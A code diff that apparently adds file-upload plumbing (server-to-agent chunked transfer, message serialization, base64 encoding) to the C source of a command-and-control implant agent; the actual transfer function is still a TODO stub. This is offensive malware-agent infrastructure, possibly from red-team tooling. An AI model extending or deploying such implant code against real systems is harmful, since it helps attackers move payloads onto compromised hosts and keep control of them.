@@ -272,3 +272,70 @@ void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char 
 	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
 }
+
+/*
+ *
+ * UPLOAD LOGIC
+ *
+ * In this context, we mean "uploading" from the C2 server TO the agent.
+ *
+*/
+
+UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid) {
+	UploadManager upload = { 0 };
+	
+	upload.callback_uuid = clone_str(callback_uuid);
+	upload.task_id = clone_str(task_id);
+	upload.file_uuid = clone_str(file_uuid);
+	upload.chunk_size = FILE_CHUNK_SIZE;
+	upload.next_chunk = 1;
+	upload.current_buffer = KERNEL32$VirtualAlloc(0, FILE_CHUNK_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	upload.buflen = FILE_CHUNK_SIZE;
+	upload.finished = FALSE;
+	
+	return upload;
+}
+
+char *generate_upload_message(UploadManager *upload) {
+	// Allocate space and construct the serialized upload message.
+	
+	int len = 1024;
+	int offset = 0;
+	
+	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	
+	// Prepend the Callback UUID (36 bytes).
+	for (int i = 0; i < 36; i++) {
+		msg[offset] = upload->callback_uuid[i];
+		offset++;
+	}
+	
+	// 1 byte for the message type.
+	pack_char(msg, &offset, MESSAGE_TYPE_UPLOAD);
+	
+	// Task and file ID.
+	pack_string(msg, &offset, upload->task_id);
+	pack_string(msg, &offset, upload->file_uuid);
+	
+	// Chunk information.
+	pack_uint(msg, &offset, upload->chunk_size);
+	pack_uint(msg, &offset, upload->next_chunk);
+	
+	// Base64-encode the serialized message.
+	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	base64_encode(msg, offset, encoded_msg);
+	
+	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+	return encoded_msg;
+}
+
+void perform_upload(AgentState *state, UploadManager *upload) {
+	// Generate upload payload.
+	char *msg = generate_upload_message(upload);
+	
+	dprintf("DELETEME generated msg, ready to perform...");
+	
+	// TODO
+	
+	upload->finished = TRUE; // DELETEME just to avoid infinite loop while testing...
+}
